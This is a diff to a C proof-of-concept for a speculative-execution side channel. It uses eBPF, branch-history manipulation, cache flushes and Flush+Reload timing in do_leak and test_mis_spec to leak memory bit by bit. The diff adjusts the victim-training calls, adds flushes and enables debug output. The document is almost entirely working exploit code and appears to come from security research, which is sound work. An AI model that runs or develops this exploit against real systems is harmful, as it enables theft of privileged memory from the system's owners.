@@ -22,7 +22,7 @@
 #include "ebpf_helper.h"
 #include "ebpf_progs.h"
 #include "ebpf_poc.h"
-#include "inline_asm.h"
+#include "arch_defines.h"
 
 uint64_t start=0, len=0, pass=1;
 char *dump_filename = NULL;
@@ -99,8 +99,10 @@ int invoke_victim(int pop_bhb, int _set_ptr, int _esc, int _shuffle_bh, int _tak
     *param_take_sc =    _take_sc;
     if (flush)
     {
+        FLUSH_DCACHE(param_take_sc);
         FLUSH_DCACHE(param_set_ptr);
-        // FLUSH_DCACHE(param_esc); // DO NOT FLUSH THIS
+        FLUSH_DCACHE(param_esc); // DO NOT FLUSH THIS
+        FLUSH_DCACHE(param_shuffle_bh);
         FLUSH_DCACHE((ptr_mmap_evset + PR_OFFSET_0));
         FLUSH_DCACHE((ptr_mmap_evset + PR_OFFSET_1));
         FLUSH_DCACHE(dummy_load);
@@ -116,12 +118,19 @@ int do_leak(uint64_t ptr, uint64_t rsh, struct decode_res *res)
     int t0, t1, tx;
     for (int j = 0; j < 32; j++)
     {
-        invoke_victim(j & 3, 0xff, 0x00, 0x00, 0xff, false);
-        invoke_victim(2, 0x00, 0xff, 0x00, 0x00, false);
+        // invoke_victim(j & 3, 0xff, 0x00, 0x00, 0xff, false);
+        // invoke_victim(2, 0x00, 0xff, 0x00, 0x00, false);
+        invoke_victim(2, 0xff, 0x00, 0x00, 0x00, false);
+        // invoke_victim(2, 0x00, 0x00, 0x00, 0x00, false);
+        // invoke_victim(2, 0x00, 0x00, 0x00, 0x00, false);
+        invoke_victim(2, 0xff, 0x00, 0x00, 0x00, false);
+        invoke_victim(2, 0xff, 0x00, 0x00, 0x00, false);
+        invoke_victim(2, 0x00, 0x00, 0x00, 0x00, false);
     }
     OPS_BARRIER(128);
 
-    invoke_victim(2, 0x00, 0x00, 0xff, 0x00, true);
+    // invoke_victim(2, 0x00, 0x00, 0xff, 0x00, true);
+    invoke_victim(2, 0x00, 0x00, 0x00, 0x00, true);
 
     // check F+R probes
     trigger_ebpf(sock_prog_time, 1);
@@ -156,7 +165,7 @@ int test_mis_spec(uint64_t start, uint64_t len, uint8_t *buf)
     while (true)
     {
         do_leak(ptr, bit, &res);
-        // printf("p: %x, b: %d, tx: %d, t0: %d, t1: %d\n", ptr, bit, res.t_dummy, res.t0, res.t1);
+        printf("p: %x, b: %d, tx: %d, t0: %d, t1: %d\n", ptr, bit, res.t_dummy, res.t0, res.t1);
         if (!(res.reject))
         {
             b_leak |= (res.bit & 1) << bit;
